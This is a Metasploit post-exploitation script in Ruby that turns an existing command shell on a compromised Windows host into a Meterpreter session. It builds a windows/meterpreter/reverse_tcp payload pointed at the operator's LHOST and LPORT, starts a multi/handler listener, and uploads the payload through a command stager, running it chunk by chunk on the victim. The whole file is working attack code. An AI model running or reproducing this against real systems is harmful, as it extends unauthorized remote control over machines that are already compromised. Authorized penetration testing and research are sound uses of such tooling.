# $Id$
#
# Spawn a meterpreter session using an existing command shell session
#
# NOTE: Some of the following code is duplicated from lib/msf/core/exploit/cmdstager.rb
#
# This is really only to prove the concept for now.
#
# -jduck
#


raise RuntimeError, "You must select a session." if (not session)
raise RuntimeError, "Selected session is not a command shell session!" if (session.type != "shell")

# Check for required datastore options
if (not session.exploit_datastore['LHOST'] or not session.exploit_datastore['LPORT'])
	raise RuntimeError, "You must set LPORT and LHOST for this script to work."
end

lhost = session.exploit_datastore['LHOST']
lport = session.exploit_datastore['LPORT']
# maybe we want our sessions going to another instance?
use_handler = true
use_handler = nil if (session.exploit_datastore['DisablePayloadHandler'] == true)


# Process special var/val pairs...
# XXX: Not supported yet...
#Msf::Ui::Common.process_cli_arguments($framework, ARGV)
# Create the payload instance
payload_name = 'windows/meterpreter/reverse_tcp'
payload = framework.payloads.create(payload_name)
options = 'LHOST='+lhost + ' LPORT='+lport
buf = payload.generate_simple('OptionStr' => options)


#
# Spawn the handler if needed
#
mh = nil
if (use_handler)
	mh = framework.modules.create("exploit/multi/handler")
	mh.datastore['LPORT'] = lport
	mh.datastore['LHOST'] = lhost
	mh.datastore['PAYLOAD'] = payload_name
	mh.datastore['ExitOnSession'] = true # auto-cleanup
	mh.datastore['EXITFUNC'] = 'process'
	mh.exploit_simple(
		'LocalInput'     => session.user_input,
		'LocalOutput'    => session.user_output,
		'Payload'        => payload_name,
		'RunAsJob'       => true)
	# It takes a little time for the resources to get set up, so sleep for
	# a bit to make sure the exploit is fully working.  Without this,
	# mod.get_resource doesn't exist when we need it.
	Rex::ThreadSafe.sleep(0.5)
	if framework.jobs[mh.job_id.to_s].nil?
		raise RuntimeError, "Failed to start multi/handler"
	end
end


#
# Show the progress of the upload
#
def progress(total, sent)
	done = (sent.to_f / total.to_f) * 100
	if (done.to_f < 99.00)
		print_status("Command Stager progress - %3.2f%% done (%d/%d bytes)" % [done.to_f, sent, total])
	end
end


#
# Setup the command stager
#
los = 'win'
larch = ARCH_X86
opts = {
	#:persist => true
}
linelen = 1700
delay = 0.25

#
# Generate the stager command array
#
cmdstager = Rex::Exploitation::CmdStager.new(buf, framework, los, larch)
cmds = cmdstager.generate(opts, linelen)
if (cmds.nil? or cmds.length < 1)
	print_error("The command stager could not be generated")
	raise ArgumentError
end

#
# Calculate the total size
#
total_bytes = 0
cmds.each { |cmd| total_bytes += cmd.length }


#
# Run the commands one at a time
#
begin
	sent = 0
	cmds.each { |cmd|
		ret = session.shell_command_token_win32(cmd)
		if (ret)
			ret.strip!
			print_error(ret) if (not ret.empty?)
		end

		sent += cmd.length

		select(nil, nil, nil, delay)

		progress(total_bytes, sent)
	}
rescue ::Interrupt
	# TODO: cleanup partial uploads!
end
